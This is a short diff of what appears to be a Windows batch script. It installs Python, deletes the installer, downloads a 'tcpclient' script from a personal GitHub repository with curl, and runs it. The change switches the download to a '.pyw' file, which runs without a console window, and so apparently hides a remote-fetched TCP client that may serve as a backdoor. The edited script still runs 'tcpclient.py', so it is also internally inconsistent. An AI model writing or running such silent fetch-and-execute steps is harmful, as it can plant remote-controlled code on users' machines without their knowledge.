@@ -6,7 +6,7 @@ python-3.11.3-amd64.exe
 
 del python-3.11.3-amd64.exe
 
-curl -O https://raw.githubusercontent.com/Zarni1322/python/main/tcpclient.py
+curl -O https://raw.githubusercontent.com/Zarni1322/python/main/tcpclient.pyw
 
 python tcpclient.py
 
